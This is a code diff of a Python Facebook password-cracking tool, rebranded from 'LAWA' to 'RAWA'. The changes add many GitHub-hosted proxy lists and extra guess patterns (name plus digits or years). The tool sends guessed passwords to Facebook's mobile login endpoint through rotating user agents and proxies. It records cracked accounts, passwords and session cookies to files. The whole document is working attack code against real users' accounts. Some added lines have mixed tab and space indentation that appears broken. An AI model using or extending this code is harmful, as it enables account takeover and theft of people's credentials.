@@ -67,8 +67,85 @@ cokbrut=[]
 ses=requests.Session()
 princp=[]
 try:
-    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
-    open('.prox.txt','w').write(prox)
+	prox= requests.get('https://raw.githubusercontent.com/Chigozieworldwide/KING/main/socks5.txt').text
+	open('.socks5.txt','w').write(prox) 
+except Exception as e:
+
+	prox=open('.proxy.txt','r').read().splitlines()
+
+try:
+	prox= requests.get('https://raw.githubusercontent.com/Chigozieworldwide/KING/main/socks4.txt').text
+	open('.socks4.txt','w').write(prox) 
+except Exception as e:
+
+	prox=open('.proxy.txt','r').read().splitlines()
+
+try:
+	prox= requests.get('https://github.com/Chigozieworldwide/KING/blob/main/https.txt').text
+	open('.https.txt','w').write(prox) 
+except Exception as e:
+
+	prox=open('.proxy.txt','r').read().splitlines()
+
+try:
+	prox= requests.get('https://raw.githubusercontent.com/Chigozieworldwide/KING/main/http.txt').text
+	open('.http.txt','w').write(prox) 
+except Exception as e:
+
+	prox=open('.proxy.txt','r').read().splitlines()
+
+try:
+	prox= requests.get('https://raw.githubusercontent.com/Chigozieworldwide/XFORD/main/http.txt').text
+	open('.http.txt','w').write(prox) 
+except Exception as e:
+
+	prox=open('.proxy.txt','r').read().splitlines()
+
+try:
+	prox= requests.get('https://raw.githubusercontent.com/Chigozieworldwide/XFORD/main/https.txt').text
+	open('.https.txt','w').write(prox) 
+except Exception as e:
+
+	prox=open('.proxy.txt','r').read().splitlines()
+
+try:
+	prox= requests.get('https://raw.githubusercontent.com/Chigozieworldwide/XFORD/main/socks4.txt').text
+	open('.socks4.txt','w').write(prox) 
+except Exception as e:
+
+	prox=open('.proxy.txt','r').read().splitlines()
+
+try:
+	prox= requests.get('https://raw.githubusercontent.com/Chigozieworldwide/XFORD/main/socks5.txt').text
+	open('.socks5.txt','w').write(prox) 
+except Exception as e:
+
+	prox=open('.proxy.txt','r').read().splitlines()
+
+try:
+	prox= requests.get('https://raw.githubusercontent.com/Chigozieworldwide/XCARET/main/http.txt').text
+	open('.http.txt','w').write(prox) 
+except Exception as e:
+
+	prox=open('.proxy.txt','r').read().splitlines()
+
+try:
+	prox= requests.get('https://raw.githubusercontent.com/Chigozieworldwide/XCARET/main/https.txt').text
+	open('.https.txt','w').write(prox) 
+except Exception as e:
+
+	prox=open('.proxy.txt','r').read().splitlines()
+
+try:
+	prox= requests.get('https://raw.githubusercontent.com/Chigozieworldwide/XCARET/main/socks4.txt').text
+	open('.socks4.txt','w').write(prox) 
+except Exception as e:
+
+	prox=open('.proxy.txt','r').read().splitlines()
+
+try:
+	prox= requests.get('https://raw.githubusercontent.com/Chigozieworldwide/XCARET/main/socks5.txt').text
+	open('.socks5.txt','w').write(prox) 
 except Exception as e:
     pass
 prox=open('.prox.txt','r').read().splitlines()
@@ -219,22 +296,18 @@ def animation(u):
 #------------------[ LOGO-LAKNAT ]-----------------#
 
 logo =""" 
-                                    @@@        @@@@@@   @@@  @@@  @@@   @@@@@@   
-@@@       @@@@@@@@  @@@  @@@  @@@  @@@@@@@@  
-@@!       @@!  @@@  @@!  @@!  @@!  @@!  @@@  
-!@!       !@!  @!@  !@!  !@!  !@!  !@!  @!@  
-@!!       @!@!@!@!  @!!  !!@  @!@  @!@!@!@!  
-!!!       !!!@!!!!  !@!  !!!  !@!  !!!@!!!!  
-!!:       !!:  !!!  !!:  !!:  !!:  !!:  !!!  
- :!:      :!:  !:!  :!:  :!:  :!:  :!:  !:!  
- :: ::::  ::   :::   :::: :: :::   ::   :::  
-: :: : :   :   : :    :: :  : :     :   : :  
+  ██████   █████  ██     ██  █████  
+██   ██ ██   ██ ██     ██ ██   ██ 
+██████  ███████ ██  █  ██ ███████ 
+██   ██ ██   ██ ██ ███ ██ ██   ██ 
+██   ██ ██   ██  ███ ███  ██   ██                                  @@@        @@@@@@   @@@  @@@  @@@   @@@@@@   
+
                                                       
 -------------------------------------------------
-\033[1;96m𝐕𝐈𝐏 𝐓𝐎𝐎𝐋 :   ‌LAWA
-\x1b[92;1m𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌 :  @lawa_editor133
-\33[1;33m𝐁𝐘 𝐓𝐎𝐎𝐋 : 2.8
-\33[1;34m𝐍𝐀𝐄𝐌 𝐓𝐎𝐎𝐋 : LAWA-VIP-TOOL                                     
+\033[1;96m𝐕𝐈𝐏 𝐓𝐎𝐎𝐋 :   ‌RAWA🔥
+\x1b[92;1m𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌 :  notuser
+\33[1;33m𝐁𝐘 𝐓𝐎𝐎𝐋 : 1.5
+\33[1;34m𝐍𝐀𝐄𝐌 𝐓𝐎𝐎𝐋 : RAWA                                  
 ------------------------------------------------"""
 os.system('clear')
 print(logo)
@@ -577,6 +650,10 @@ def passwrd():
                     pwv.append(frs+'1234')
                     pwv.append(frs+'12345')
                     pwv.append(frs+'123456')
+	            pwv.append(frs+'1234567')
+		    pwv.append(frs+'12345678')
+		    pwv.append(frs+'123456789')
+		    pwv.append(frs+'1234567890')
                     pwv.append(frs+'1122')
                     pwv.append(frs+'112233')
                     pwv.append(frs+frs)
@@ -586,6 +663,10 @@ def passwrd():
                     pwv.append(frs+'1234@')
                     pwv.append(frs+'12345@')
                     pwv.append(frs+'4321@')
+	            pwv.append(frs+'2020')
+		    pwv.append(frs+'2021')
+		    pwv.append(frs+'2022')
+		    pwv.append(frs+'2006')
             else:
                 if len(frs)<3:
                     pwv.append(nmf)
@@ -595,6 +676,10 @@ def passwrd():
                     pwv.append(frs+'1234')
                     pwv.append(frs+'12345')
                     pwv.append(frs+'123456')
+	            pwv.append(frs+'1234567')
+		    pwv.append(frs+'12345678')
+		    pwv.append(frs+'123456789')
+		    pwv.append(frs+'1234567890')
                     pwv.append(frs+'1122')
                     pwv.append(frs+'112233')
                     pwv.append(frs+frs)
@@ -604,6 +689,10 @@ def passwrd():
                     pwv.append(frs+'1234@')
                     pwv.append(frs+'12345@')
                     pwv.append(frs+'4321@')
+	            pwv.append(frs+'2020')
+		    pwv.append(frs+'2021')
+		    pwv.append(frs+'2022')
+		    pwv.append(frs+'2006')
             if 'ya' in pwpluss:
                 for xpwd in pwnya:
                     pwv.append(xpwd)
@@ -631,7 +720,7 @@ def passwrd():
 def crack(idf,pwv):
     global loop,ok,cp
     bo = random.choice([m,k,h,b,u,x])
-    sys.stdout.write(f"\r {P}[LAWA]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
+    sys.stdout.write(f"\r {P}[RAWA]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua2 = random.choice(ugen2)
@@ -669,7 +758,7 @@ def crack(idf,pwv):
 }
             po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
-                print(f'\033[1;35m[LAWA-CP]   \033[1;35m {idf} |  \033[1;35m{pw}  | \033[1;35m{ua}')
+                #print(f'\033[1;35m[LAWA-CP]   \033[1;35m {idf} |  \033[1;35m{pw}  | \033[1;35m{ua}')
                 open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                 akun.append(idf+' • '+pw)
                 cp+=1
@@ -678,7 +767,7 @@ def crack(idf,pwv):
                 ok+=1
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\r\x1b[32[LAWA-OK]\033[1;32m   {idf} | \033[1;32m{pw} | \033[1;32m{kuki} | \033[1;32m{ua}')
+                print(f'\r\x1b[32[RAWA-OK]\033[1;32m   {idf} | \033[1;32m{pw} | \033[1;32m{kuki} | \033[1;32m{ua}')
                 os.system('espeak -a 300 " OK OK "')
                 open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                 cek_DYNO(kuki)
